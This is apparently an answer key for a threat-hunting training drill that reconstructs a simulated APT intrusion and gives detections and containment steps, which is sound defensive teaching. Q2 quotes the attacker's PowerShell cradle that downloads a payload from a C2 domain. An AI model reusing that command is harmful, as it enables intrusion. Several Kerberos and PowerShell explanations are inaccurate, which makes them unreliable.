# Drill 01 (Advanced) Solution: APT Endpoint Hunting

---

## Q1 — Hunting Hypotheses (3 points)

**Strong sample hypotheses (1 point each, up to 3):**

```text
HYPOTHESIS 1: "If APT-42 has compromised our environment via spearphishing,
we expect to see a Microsoft Office application spawning a scripting engine (PowerShell/cmd)
evidenced by Event ID 4688 / Sysmon Event 1 showing WINWORD.EXE or EXCEL.EXE
as parent of powershell.exe, in Windows Security/Sysmon logs."
→ STATUS: CONFIRMED (EXEC-PC01, 09:16:05)
```

```text
HYPOTHESIS 2: "If APT-42 has established persistence, we expect to see scheduled tasks
with names mimicking Windows Update or Microsoft Edge that run powershell.exe or rundll32.exe,
evidenced by Event ID 4698 in Windows Security logs and new XML files in C:\Windows\System32\Tasks\."
→ STATUS: CONFIRMED (FILESERVER01, 10:22:00 — \Microsoft\Windows\EdgeUpdate\ScheduledUpdate)
```

```text
HYPOTHESIS 3: "If APT-42 is exfiltrating data, we expect to see large outbound connections
(>10MB) from endpoint processes to domains registered in the last 30 days or IPs not in
our approved egress list, evidenced by Sysmon Event 3 / EDR network events showing
high bytes_sent values to external destinations."
→ STATUS: CONFIRMED (EXEC-PC01, 10:31:00 — 47.2MB to 198.51.100.42)
```

```text
HYPOTHESIS 4: "If APT-42 is using DLL side-loading, we expect to see legitimate signed
Microsoft executables loading DLLs from user-writable paths or with mismatched hashes,
evidenced by Sysmon Event 7 (Image Loaded) showing unexpected DLL paths."
→ STATUS: CONFIRMED (09:45-09:46 — MicrosoftEdge.exe loading malicious DLL)
```

---

## Q2 — Initial Compromise Analysis (4 points)

**a) PowerShell command analysis:**

```powershell
sal a New-Object        # Creates alias 'a' for New-Object cmdlet
$a=a Net.WebClient      # Creates a new WebClient object using alias
$a.DownloadFile(
  'hxxps://edge-analytics-cdn.net/ms/update.bin',
  'C:\Users\ceo\AppData\Local\Temp\update.bin'
)
```

**What it does:** Downloads a file (`update.bin`, actually a DLL) from the attacker's C2 domain to the user's Temp directory.

**Evasion techniques:**

1. **`-exec bypass`** — bypasses PowerShell execution policy
1. **`-w 1`** — WindowStyle Minimized (or actually `-w hidden` abbreviated as `-w 1` = WindowStyle=1=Normal, though the intent is to minimize visibility)
1. **`-nop`** — NoProfile (skips loading the user's PowerShell profile, avoids profile-based detection hooks)
1. **`sal a New-Object`** — aliases `New-Object` to `a` to break simple string detection for "New-Object" and "Net.WebClient"
1. **`hxxp`** defang → `https` in reality — the attacker's domain uses HTTPS (encrypted, makes content inspection difficult)
1. **Domain registered 13 days ago** — freshly registered to avoid reputation-based blocking

**b) DLL side-loading:**

**How it works:**

1. The attacker created a malicious DLL named `MicrosoftEdgeUpdate.dll` — identical name to a legitimate Edge component
1. Placed it in `C:\Users\ceo\AppData\Local\Microsoft\EdgeUpdate\` — a path that Edge legitimately uses but that is user-writable
1. When `MicrosoftEdge.exe` (a legitimate, signed Microsoft binary) looks for `MicrosoftEdgeUpdate.dll` during startup or update check, Windows' DLL search order causes it to find the malicious copy first (in AppData before System32)
1. The malicious DLL loads within the context of a **trusted, signed Microsoft process** — making it appear legitimate to security tools that check parent process signatures

**EDR evasion:** Most behavioral detection rules check the parent process.
Since `MicrosoftEdge.exe` is legitimate, process-based rules may not flag the child activity.
The malicious code runs under Edge's process identity, potentially with the same network trust level.

**c) Anomalous User-Agent:**

`MSIE 9.0 / Windows NT 6.1` decodes to:

* **MSIE 9.0** = Internet Explorer 9 (released 2011, ended support 2022)
* **Windows NT 6.1** = Windows 7 (released 2009, end of life 2020)

This is running on a Windows 11 machine.
The User-Agent is spoofed to:

1. **Evade reputation-based detection** — some tools flag modern browsers connecting to malicious sites; an old IE UA may bypass certain proxies
1. **Fingerprinting evasion** — makes forensic attribution harder
1. **Proxy bypass** — some network proxies may treat old browser UAs differently

**A sophisticated threat hunter notes:** In a Windows 11 environment, IE9-style requests are anachronistic and should be flagged.
Modern C2 frameworks (Cobalt Strike, Havoc, Mythic) typically use configurable malleable profiles including custom User-Agent strings.

**d) MITRE ATT&CK Mapping for EXEC-PC01:**

| Time | Technique | Sub-technique | Description |
|------|-----------|---------------|-------------|
| 09:15 | T1566.001 | Spearphishing Attachment | Malicious .docm via email |
| 09:16:05 | T1059.001 | PowerShell | Word macro spawns PS |
| 09:16:11 | T1105 | Ingress Tool Transfer | Download update.bin |
| 09:16:25 | T1218.011 | Rundll32 | Execute DLL via rundll32 |
| 09:17-09:18 | T1082 | System Information Discovery | systeminfo |
| 09:17-09:18 | T1069.002 | Domain Groups | net group domain admins |
| 09:18:01 | T1083 | File and Directory Discovery | dir *.pdf *.docx |
| 09:45-09:46 | T1574.002 | DLL Side-Loading | Malicious EdgeUpdate.dll |
| 10:02 | T1547.001 | Registry Run Keys | HKCU\Run persistence |
| 10:30 | T1560.001 | Archive Collected Data: 7-Zip | exfil_001.7z |
| 10:31 | T1048.002 | Exfiltration Over HTTPS | 47MB sent to C2 |

---

## Q3 — Lateral Movement Reconstruction (4 points)

**a) Credential material and acquisition:**

The attacker accessed FILESERVER01 using the authenticated session of `CORP\ceo` from EXEC-PC01.
Specifically:

* PID 3401 (`rundll32.exe` / malicious DLL) on EXEC-PC01 made network connections
* It accessed `\\FILESERVER01\Projects\ClearanceL3\`
* This worked because the CEO's Kerberos tickets or NTLM credentials were available in memory on EXEC-PC01 (part of the current logon session)

How credentials were obtained: The attacker likely **used the existing Windows authentication tokens** (impersonation/token theft — T1134) from the CEO's active session, rather than dumping LSASS.
The CEO's logon session's Kerberos TGT was already in memory and usable.

At 09:48:22 on FILESERVER01, a WMI event fired (svchost spawning PowerShell) — this means the attacker also established a beachhead on FILESERVER01, likely by using WMI lateral movement (T1047) with the CEO's credentials.

**b) DC01 sequence — DCSync preparation:**

| Event | What's Happening |
|-------|-----------------|
| 10:18 — Event 4769, krbtgt, RC4 downgrade | Attacker requested a Kerberos service ticket for `krbtgt` (the Kerberos master key service). This is unusual — normal users don't request krbtgt service tickets. This is reconnaissance for a **Kerberoasting** attempt. |
| 10:19 — Event 4662, LDAP write to Domain Users | The attacker used LDAP to query domain objects. The specific access pattern (querying the replication partition) indicates they are **preparing for DCSync** — a technique that impersonates a domain controller to request all password hashes via the Directory Replication Service (DRS). |
| 10:25 — Event 4648, svc_backup logon from CEO's PC | The attacker obtained credentials for `svc_backup@corp.local` (likely by cracking a Kerberoasted hash or finding credentials in memory) and used them from the CEO's workstation. |
| 10:30 — Event 4768, svc_backup, AS-REP with no pre-auth | The `svc_backup` account does not require Kerberos pre-authentication (`Pre-auth type: 0`). This means it is **AS-REP Roastable** — anyone can request a TGT for this account and receive an encrypted blob that can be cracked offline. |
| 10:35 — Event 4769, GC/DC01 replication service ticket | The attacker requested a service ticket for the **Global Catalog replication service** (`GC/DC01`). This is the specific Kerberos ticket needed to authenticate the DCSync operation. |

**The attacker is building towards DCSync (T1003.006):** Using `svc_backup`'s credentials to impersonate a DC and request password hash replication for ALL users in the domain, including Domain Admins and krbtgt.

**c) RC4_HMAC_MD5 in Kerberos:**

RC4_HMAC_MD5 is an older, weaker encryption type for Kerberos.
Modern AD environments prefer AES-128 and AES-256.

Implications:

* **Kerberoasting indicator:** Attackers force RC4 downgrade because RC4 hashes are significantly faster to crack offline than AES. When service ticket requests use RC4 even in an AES-capable environment, it's a strong indicator of Kerberoasting.
* **Detection value:** Any service ticket request (Event 4769) using RC4_HMAC in an AES-configured domain should be flagged. Microsoft added this specific detection to their Defender for Identity product.
* **MITRE technique:** T1558.003 — Steal or Forge Kerberos Tickets: Kerberoasting

---

## Q4 — Exfiltration Analysis (3 points)

**a) Data volume and operational security:**

* **47MB exfiltrated** — this is a significant data volume but small enough to complete in ~4 minutes over an HTTPS connection. The attacker was selective (not dumping the full system).

**Password-protected 7-Zip archive (operational security meaning):**

1. **Content inspection evasion:** Network proxies and DLP tools cannot inspect the contents of an encrypted archive. Even if the file transfer is detected, the data itself is protected.
1. **Forensic protection:** If the exfiltration is detected and the archive is recovered, it cannot be read without the password. This limits the organization's ability to know exactly what was taken.
1. **Transfer integrity:** 7-Zip provides compression + encryption, reducing size and ensuring data arrives intact.
1. **Attribution complication:** Cannot definitively prove *what* was in the archive if only the file transfer is detected.

**b) Data sensitivity:**

The combination is extremely sensitive for a defense contractor:

* **CEO's Documents** — strategic plans, business decisions, financial information, board materials, merger/acquisition data, executive communications
* **ClearanceL3 Project Files** — security-cleared (Level 3) project documentation from FILESERVER01 — likely containing sensitive defense contract details, technical specifications, potentially classified-adjacent information

For a state-sponsored actor, this combination provides strategic intelligence value: corporate strategy (CEO documents) + technical details of defense projects (ClearanceL3).
This is precisely the type of economic espionage that defense contractors are specifically warned about by the FBI and CISA.

**c) Exfiltration detection rule:**

```text
RULE: Large Upload to New External Destination (Exfiltration Indicator)
Data Source: Proxy/Firewall/EDR Network Events
Condition:
  bytes_sent > 10MB
  AND destination_ip NOT IN (known_good_destinations)
  AND (
    domain_registration_age < 30_days
    OR destination_ip NOT IN (cloud_provider_ranges)
    OR ssl_cert_issuer NOT IN (known_issuers)
  )
  AND process NOT IN (backup_processes, update_processes)
Alert Level: HIGH

Enhancement:
  Flag any upload > 1MB from processes that have also made
  suspicious process-create events in the same session
```

---

## Q5 — Persistence Analysis (3 points)

**Mechanism 1: DLL Side-Loading + Registry Run Key (EXEC-PC01)**

* **Survives reboot:** The Registry Run key (`HKCU\...\Run\MicrosoftEdgeUpdate`) executes on every user login. It points to the malicious DLL in AppData. When Edge starts (either from Run key or user-launched), the malicious DLL side-loads.
* **Forensic discovery:**
  * Check `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` for unexpected entries
  * Compare DLL file hashes against known-good baselines: `Get-FileHash "C:\Users\*\AppData\Local\Microsoft\EdgeUpdate\*.dll" -Algorithm SHA256`
  * Sysmon Event 13 (RegistryEvent) would have logged the Run key creation
* **Removal preserving evidence:**
  1. Hash the DLL file before touching anything
  1. Copy the file to a forensic evidence share
  1. Export the registry key: `reg export HKCU\Software\Microsoft\Windows\CurrentVersion\Run backup.reg`
  1. Delete the DLL from AppData
  1. Remove the registry value

**Mechanism 2: Scheduled Task (FILESERVER01)**

* **Survives reboot:** Scheduled task running daily at 02:00 with repetition every 4 hours, running as SYSTEM. Immediately available on next system start.
* **Forensic discovery:**

  * `Get-ScheduledTask | Where-Object {$_.TaskPath -like '\Microsoft\Windows\EdgeUpdate\*'}`

  * Check `C:\Windows\System32\Tasks\Microsoft\Windows\EdgeUpdate\` for task XML files
  * Sysmon Event 1 showing `schtasks.exe /create` would have captured creation
  * Windows Event 4698 (task created) — present in evidence
* **Removal preserving evidence:**
  1. Export task XML: `schtasks /query /tn "\Microsoft\Windows\EdgeUpdate\ScheduledUpdate" /xml > task_backup.xml`
  1. Capture memory if agent is running
  1. `schtasks /delete /tn "\Microsoft\Windows\EdgeUpdate\ScheduledUpdate" /f`

---

## Q6 — Scope Assessment (4 points)

**a) Confirmed compromised systems:**

1. **EXEC-PC01** — Initial access, malicious code execution confirmed (PIDs 3301, 3401, DLL sideloading). COMPROMISED.
1. **FILESERVER01** — Lateral movement confirmed (WMI-spawned PowerShell, credential access to Projects share, scheduled task persistence). COMPROMISED.
1. **DC01** — Suspicious Kerberos activity (AS-REP roasting, DCSync preparation) but no confirmed code execution on DC01 itself. STATUS: UNDER ACTIVE ATTACK / LIKELY NEXT TARGET.

**b) Worst-case if DCSync completes:**

If the attacker successfully executes DCSync (requesting Active Directory replication via DRS):

1. **All domain password hashes extracted** — every user in the organization, including all domain admins, service accounts, and privileged accounts
1. **krbtgt hash extracted** → enables **Golden Ticket** creation — forged Kerberos TGTs that grant access to any service in the domain for 10 years without any authentication
1. **Complete domain compromise** — with a Golden Ticket, the attacker has effectively permanent, unrestricted access to the entire AD domain, all member servers, and all services
1. **Remediation requires domain reset** — the only way to definitively remediate a Golden Ticket scenario is to reset the `krbtgt` account password **twice** (because of how KDC replication works), force logout of all sessions, and potentially do a full domain rebuild in severe cases

**This is the organizational catastrophe scenario for Active Directory environments.**

**c) Containment sequence (order matters):**

```text
1. IMMEDIATELY: Block 198.51.100.42 at all perimeter firewalls

   Why: Stops any in-progress DCSync, exfiltration, or new instructions

2. ISOLATE DC01 from network (keep it running but disconnect)
   Why: If DCSync hasn't happened yet, disconnecting DC01 prevents it
   Risk: Will cause authentication disruption — business decision required

3. ISOLATE FILESERVER01
   Why: Persistent scheduled task; still an active attacker base

4. ISOLATE EXEC-PC01
   Why: Original compromised host; contains C2 agent
   Note: Isolate last (after C2 is blocked) to preserve C2 channel data

5. Reset krbtgt password TWICE (immediately, with 10-hour gap)
   Why: If DCSync was partially completed, invalidates any issued Kerberos tickets

6. Reset svc_backup account password
   Why: Confirmed compromised; may have been Kerberoasted

7. Reset CEO's (ceo@corp.local) credentials
   Why: Active session was hijacked; all derived tokens are compromised
```

**d) Systems to treat as compromised even without direct evidence:**

* Any system `ceo@corp.local` had an active Kerberos session on (tokens can be used for lateral movement)
* Any system `svc_backup` had access to
* Any system in the same network segment as FILESERVER01 (potential WMI/SMB lateral movement)
* Any system that DC01 authenticates on behalf of (if Golden Ticket was issued — all of them)

---

## Q7 — Threat Hunt Report (5 points)

**THREAT HUNT REPORT**
**Organization:** [Defense Contractor]

**Date:** 2024-04-15

**Classification:** SENSITIVE — INCIDENT RESPONSE

**Author:** Threat Hunt Team

---

**EXECUTIVE SUMMARY**

A state-sponsored threat actor (consistent with APT-42 TTPs) has achieved persistent, privileged access to at least two systems and is actively working toward full domain compromise.
The CEO's workstation was the initial access point via a spearphishing document, from which the attacker exfiltrated approximately 47MB of sensitive documents including classified-level project files.
Immediate containment action is required to prevent complete Active Directory compromise.

---

**SYSTEMS AFFECTED**

| System | Status | Compromise Details |
|--------|--------|-------------------|
| EXEC-PC01 | COMPROMISED | Initial access, code execution, data exfiltration |
| FILESERVER01 | COMPROMISED | Lateral movement, data access, persistent scheduled task |
| DC01 | UNDER ATTACK | Kerberoasting in progress, DCSync preparation |

---

**ATTACK TIMELINE**

| Time | Event |
|------|-------|
| 09:15 | CEO opens malicious Q1_Strategy_Update.docm from email |
| 09:16 | Malicious macro executes PowerShell; downloads 892KB DLL from edge-analytics-cdn.net |
| 09:16–09:19 | Initial C2 established; environment reconnaissance conducted |
| 09:45 | DLL side-loading persistence via Edge process established |
| 10:02 | Registry Run key persistence added |
| 09:48–10:25 | Lateral movement to FILESERVER01 via WMI; 847 ClearanceL3 files accessed |
| 10:18–10:35 | Domain Controller targeting: Kerberoasting of krbtgt, AS-REP roasting of svc_backup, DCSync preparation |
| 10:30–10:31 | 47MB data exfiltration to C2 infrastructure |

---

**DATA AT RISK**

* CEO Documents: strategic plans, financial data, executive communications
* ClearanceL3 Project Files: 847 documents from classified defense projects
* Domain credentials: svc_backup account confirmed compromised; full credential dump (DCSync) may have occurred

---

**IMMEDIATE ACTIONS REQUIRED**

1. Block 198.51.100.42 and edge-analytics-cdn.net at all egress points
1. Isolate FILESERVER01 and EXEC-PC01 (coordinate with business to minimize operational impact)
1. Prevent DC01 from servicing replication requests temporarily; assess for DCSync completion
1. Reset krbtgt password twice (with mandatory 10-hour minimum gap)
1. Reset svc_backup and CEO credentials
1. Initiate data breach assessment for 847 ClearanceL3 files — notify security clearance authority if required

---

**DETECTION GAPS**

1. **C2 domain not in watchlist:** edge-analytics-cdn.net (13 days old at time of attack) was not in SIEM threat intel feeds. New domain monitoring (domains < 30 days) is not implemented.

1. **No DLP on large outbound transfers:** 47MB egress to an external IP generated no alert. Outbound data volume thresholds are not configured.

1. **No Kerberoasting detection:** Event 4769 requests using RC4_HMAC in an AES-capable domain were not being alerted. This is a known Microsoft Defender for Identity detection.

1. **AS-REP roastable account:** svc_backup had Kerberos pre-authentication disabled — a known misconfiguration that should be caught by regular AD security audits.

1. **No anomalous scheduled task alerting:** The malicious scheduled task on FILESERVER01 named to mimic legitimate Edge updates was not flagged by any existing rule.
